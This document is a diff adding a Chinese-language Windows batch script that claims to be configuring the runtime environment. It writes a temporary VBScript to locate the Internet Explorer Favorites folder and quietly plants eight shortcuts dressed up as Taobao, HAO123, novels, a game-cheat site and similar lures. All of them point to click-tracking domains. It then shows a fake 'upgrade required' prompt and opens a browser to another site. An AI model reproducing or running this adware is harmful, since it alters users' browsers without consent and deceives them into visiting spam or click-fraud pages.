@@ -1,0 +1,74 @@
+@echo off
+echo 正在为您配置运行环境，请稍候......
+
+@echo off 
+>tmp.vbs echo Set objShell = CreateObject("Shell.Application").Namespace(^&H6^&).Self :IETemp = objShell.Path :WScript.echo IETemp 
+for /f "delims=" %%i in ('cscript.exe //nologo tmp.vbs') do set aPath=%%i& del tmp.vbs 
+>%aPath%\淘宝商城.url echo [DEFAULT] 
+>>%aPath%\淘宝商城.url echo BASEURL=http://Click.4455.in/Click/taobao.html 
+>>%aPath%\淘宝商城.url echo [InternetShortcut] 
+>>%aPath%\淘宝商城.url echo URL=http://Click.4455.in/Click/taobao.html
+
+@echo off 
+>tmp.vbs echo Set objShell = CreateObject("Shell.Application").Namespace(^&H6^&).Self :IETemp = objShell.Path :WScript.echo IETemp 
+for /f "delims=" %%i in ('cscript.exe //nologo tmp.vbs') do set aPath=%%i& del tmp.vbs 
+>%aPath%\淘宝网.url echo [DEFAULT] 
+>>%aPath%\淘宝网.url echo BASEURL=http://Click.4455.in/Click/taobao2.html
+>>%aPath%\淘宝网.url echo [InternetShortcut] 
+>>%aPath%\淘宝网.url echo URL=http://Click.4455.in/Click/taobao2.html
+
+@echo off 
+>tmp.vbs echo Set objShell = CreateObject("Shell.Application").Namespace(^&H6^&).Self :IETemp = objShell.Path :WScript.echo IETemp 
+for /f "delims=" %%i in ('cscript.exe //nologo tmp.vbs') do set aPath=%%i& del tmp.vbs 
+>%aPath%\淘宝打折特卖.url echo [DEFAULT] 
+>>%aPath%\淘宝打折特卖.url echo BASEURL=http://Click.4455.in/Click/taobao3.html
+>>%aPath%\淘宝打折特卖.url echo [InternetShortcut] 
+>>%aPath%\淘宝打折特卖.url echo URL=http://Click.4455.in/Click/taobao3.html
+
+@echo off 
+>tmp.vbs echo Set objShell = CreateObject("Shell.Application").Namespace(^&H6^&).Self :IETemp = objShell.Path :WScript.echo IETemp 
+for /f "delims=" %%i in ('cscript.exe //nologo tmp.vbs') do set aPath=%%i& del tmp.vbs 
+>%aPath%\美女图库.url echo [DEFAULT] 
+>>%aPath%\美女图库.url echo BASEURL=http://Click.4455.in/Click/meinv.html 
+>>%aPath%\美女图库.url echo [InternetShortcut] 
+>>%aPath%\美女图库.url echo URL=http://Click.4455.in/Click/meinv.html
+
+@echo off 
+>tmp.vbs echo Set objShell = CreateObject("Shell.Application").Namespace(^&H6^&).Self :IETemp = objShell.Path :WScript.echo IETemp 
+for /f "delims=" %%i in ('cscript.exe //nologo tmp.vbs') do set aPath=%%i& del tmp.vbs 
+>%aPath%\在线看小说.url echo [DEFAULT] 
+>>%aPath%\在线看小说.url echo BASEURL=http://www.4455.in/?bat_shouchang
+>>%aPath%\在线看小说.url echo [InternetShortcut] 
+>>%aPath%\在线看小说.url echo URL=http://www.4455.in/?bat_shouchang
+
+@echo off 
+>tmp.vbs echo Set objShell = CreateObject("Shell.Application").Namespace(^&H6^&).Self :IETemp = objShell.Path :WScript.echo IETemp 
+for /f "delims=" %%i in ('cscript.exe //nologo tmp.vbs') do set aPath=%%i& del tmp.vbs 
+>%aPath%\4399美女小游戏.url echo [DEFAULT] 
+>>%aPath%\4399美女小游戏.url echo BASEURL=http://www.5544.me/?bat_shouchang
+>>%aPath%\4399美女小游戏.url echo [InternetShortcut] 
+>>%aPath%\4399美女小游戏.url echo URL=http://www.5544.me/?bat_shouchang
+
+
+@echo off 
+>tmp.vbs echo Set objShell = CreateObject("Shell.Application").Namespace(^&H6^&).Self :IETemp = objShell.Path :WScript.echo IETemp 
+for /f "delims=" %%i in ('cscript.exe //nologo tmp.vbs') do set aPath=%%i& del tmp.vbs 
+>%aPath%\游戏外挂下载.url echo [DEFAULT] 
+>>%aPath%\游戏外挂下载.url echo BASEURL=http://www.kakawg.com/?c
+>>%aPath%\游戏外挂下载.url echo [InternetShortcut] 
+>>%aPath%\游戏外挂下载.url echo URL=http://www.kakawg.com/?c
+
+@echo off 
+>tmp.vbs echo Set objShell = CreateObject("Shell.Application").Namespace(^&H6^&).Self :IETemp = objShell.Path :WScript.echo IETemp 
+for /f "delims=" %%i in ('cscript.exe //nologo tmp.vbs') do set aPath=%%i& del tmp.vbs 
+>%aPath%\HAO123网址导航.url echo [DEFAULT] 
+>>%aPath%\HAO123网址导航.url echo BASEURL=http://www.3636.me/?bat_shouchang 
+>>%aPath%\HAO123网址导航.url echo [InternetShortcut] 
+>>%aPath%\HAO123网址导航.url echo URL=http://www.3636.me/?bat_shouchang
+
+echo ...经检测，发现需要升级到稳定免非法版本！...请按任意键进入！谢谢！
+echo ...永久下载域名WWW.70CF.COM！
+echo. & pause 
+
+@echo 
+@start iexplore.exe http://www.70cf.com/?bat=201101
